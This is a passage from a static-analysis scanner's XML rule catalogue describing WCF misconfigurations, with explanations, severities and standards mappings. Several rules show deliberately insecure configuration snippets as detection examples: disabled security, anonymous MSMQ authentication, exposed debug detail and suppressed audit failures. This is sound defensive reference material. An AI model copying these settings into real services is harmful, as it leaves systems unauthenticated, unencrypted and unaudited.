							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11]  <em>Common Security Scenarios</em> Microsoft<br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 285</em> <br></p>
																									   <p>[13] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3, Requirement 7.2</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7, Requirement 7.2</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>
																									   <p>[22]  <em>Transport Security with an Anonymous Client</em> Microsoft<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_debug_information</key>
    <internalKey>Environment/WCF Misconfiguration/Debug Information</internalKey>
    <name>WCF Misconfiguration: Debug Information</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Debugging information helps attackers learn about the system and plan a form of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Windows Communication Framework (WCF) services can be configured to expose debugging information. Debug information should not be used in production environments. The <code>&lt;serviceDebug&gt;</code> tag defines whether the debug information feature is enabled for a WCF service.<br><br><br><br>If the attribute <code>includeExceptionDetailInFaults</code> is set to <code>true</code>, exception information from the application will be returned to clients. Attackers can leverage the additional information they gain from debugging output to mount attacks targeted on the framework, database, or other resources used by the application.<br><br>Example: The following configuration file includes the <code>&lt;serviceDebug&gt;</code> tag:<br><pre><br>&lt;configuration&gt;<br>  &lt;system.serviceModel&gt;<br>    &lt;behaviors&gt;<br>      &lt;serviceBehaviors&gt;<br>        &lt;behavior name=&quot;MyServiceBehavior&quot;&gt;<br>          &lt;serviceDebug includeExceptionDetailInFaults=&quot;True&quot; httpHelpPageEnabled=&quot;True&quot;/&gt;<br>...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em><serviceDebug></em> Microsoft<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 215</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_insecure_transport</key>
    <internalKey>Environment/WCF Misconfiguration/Insecure Transport</internalKey>
    <name>WCF Misconfiguration: Insecure Transport</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The application configuration should ensure that HTTPS is used for all access to sensitive information.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If an application handles sensitive information and does not use message-level encryption, then it should only be allowed to communicate over an encrypted transport channel.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em><httpsTransport></em> Microsoft<br></p>
																									   <p>[2]  <em><httpTransport></em> Microsoft<br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[6] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[23] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_insufficient_audit_failure_handling</key>
    <internalKey>Environment/WCF Misconfiguration/Insufficient Audit Failure Handling</internalKey>
    <name>WCF Misconfiguration: Insufficient Audit Failure Handling</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program is configured not to generate an exception when it fails to write to an audit log.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If WCF is configured not to throw an exception when it is unable to write to an audit log, the program will not be notified of the failure and auditing of critical security events may not occur.<br><br><b>Example 1:</b> The <code>&lt;behavior/&gt;</code> element of the WCF configuration file below instructs WCF to not notify the application when WCF fails to write to an audit log.<br><br><pre><br>&lt;behaviors&gt;<br>   &lt;serviceBehaviors&gt;<br>      &lt;behavior name="NewBehavior"&gt;<br>         &lt;serviceSecurityAudit auditLogLocation="Application"<br>             suppressAuditFailure="true"<br>             serviceAuthorizationAuditLevel="Success"<br>             messageAuthenticationAuditLevel="Success" /&gt;<br>      &lt;/behavior&gt;<br>   &lt;/serviceBehaviors&gt;<br>&lt;/behaviors&gt;<br><br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A7 Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3120 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3120 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3120 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3120 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3120 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>AU</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AU-5 Response to Audit Processing Failures (P1)</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 388</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14]  <em>Microsoft Developer Network (MSDN)</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 10.3.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.2, Requirement 6.5.6</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.7</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_insufficient_logging</key>
    <internalKey>Environment/WCF Misconfiguration/Insufficient Logging</internalKey>
    <name>WCF Misconfiguration: Insufficient Logging</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The lack of a proper audit trail after a security incident can hamper forensic efforts.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Windows Communication Foundation (WCF) offers the ability to log successful and/or failed authentication attempts. Logging failed authentication attempts can warn administrators of potential brute force attacks. Similarly, logging successful authentication events can provide a useful audit trail when a legitimate account is compromised.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em><serviceSecurityAudit></em> Microsoft<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3680.4 CAT II, APP3680.5 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3680.4 CAT II, APP3680.5 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3680.4 CAT II, APP3680.5 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3680.4 CAT II, APP3680.5 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3680.4 CAT II, APP3680.5 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AU-12 Audit Generation (P1)</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 778</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 10.2.1, Requirement 10.2.4, Requirement 10.3.4</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 10.2.1, Requirement 10.2.4, Requirement 10.3.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 10.2.1, Requirement 10.2.4, Requirement 10.3.4</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10, Requirement 10.2.1, Requirement 10.2.4, Requirement 10.3.4</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_msmq_anonymous_transport_client</key>
    <internalKey>Environment/WCF Misconfiguration/MSMQ Anonymous Transport Client</internalKey>
    <name>WCF Misconfiguration: MSMQ Anonymous Transport Client</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Because the program fails to enable authentication when connecting to MSMQ queues, an attacker can anonymously submit messages to the queue for processing.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If authentication is not used to connect to an MSMQ queue used to deliver a message to another program, an attacker could submit an anonymous message that is malicious.<br><br><b>Example 1:</b> The <code>&lt;netMsmqBinding/&gt;</code> element of the WCF configuration file below instructs WCF to disable authentication when connecting to an MSMQ queue for message delivery.<br><br><pre><br>    &lt;bindings&gt;<br>      &lt;netMsmqBinding&gt;<br>        &lt;binding&gt;<br>          &lt;security&gt;<br>            &lt;transport msmqAuthenticationMode="None" /&gt;<br>          &lt;/security&gt;<br>        &lt;/binding&gt;<br>      &lt;/netMsmqBinding&gt;<br>    &lt;/bindings&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.2 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 285</em> <br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>IA</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15]  <em>Microsoft Developer Network (MSDN)</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 285</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10, Requirement 7.2</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3, Requirement 7.2</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7, Requirement 7.2</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8, Requirement 7.2</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_metadata</key>
    <internalKey>Environment/WCF Misconfiguration/Metadata</internalKey>
    <name>WCF Misconfiguration: Metadata</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Metadata can help attackers learn about the system and plan a form of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  WCF services can be configured to expose metadata. Metadata gives detailed service description information and should not be broadcast in production environments. The <code>HttpGetEnabled / HttpsGetEnabled</code> properties of the <code>ServiceMetaData</code> class defines whether a service will expose the metadata.<br><br><br><b>Example 1:</b> The code below instructs WCF to broadcast a service's metadata.<br><br><pre><br>    ServiceMetadataBehavior smb = new ServiceMetadataBehavior();<br>    smb.HttpGetEnabled = true;<br>    smb.HttpGetUrl = new Uri(EndPointAddress);<br>    Host.Description.Behaviors.Add(smb);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 215</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14]  <em>Metadata Publishing Behavior</em> Microsoft Developer Network (MSDN)<br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_security_not_enabled</key>
    <internalKey>Environment/WCF Misconfiguration/Security Not Enabled</internalKey>
    <name>WCF Misconfiguration: Security Not Enabled</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  No transport or message security has been defined.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Applications that transmit messages without transport or message security cannot guarantee the integrity or confidentiality of the messages. When a WCF security binding is set to <code>None</code>, both transport and message security are disabled.<br><br><br><br>The following configuration sets the security mode to <code>None</code>.<br><br><pre><br>&lt;system.serviceModel&gt;<br>&lt;bindings&gt;<br>  &lt;wsHttpBinding&gt;<br>    &lt;binding name=&quot;MyBinding&quot;&gt;<br>      &lt;security mode=&quot;None&quot;/&gt;<br>    &lt;/binding&gt;<br>&lt;/bindings&gt;<br>&lt;/system.serviceModel&gt;<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[12] Michele Leroux Bustamante <em>Fundamentals of WCF Security</em> CoDe Magazine<br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_wcf_misconfiguration_service_enumeration</key>
    <internalKey>Environment/WCF Misconfiguration/Service Enumeration</internalKey>
    <name>WCF Misconfiguration: Service Enumeration</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Publicly exposing information about a service can provide attackers with valuable insight into how they might exploit the service.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The <code>&lt;serviceMetadata&gt;</code> tag enables the metadata publishing feature. Service metadata could contain sensitive information that should not be publicly accessible.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em><serviceMetadata></em> Microsoft<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
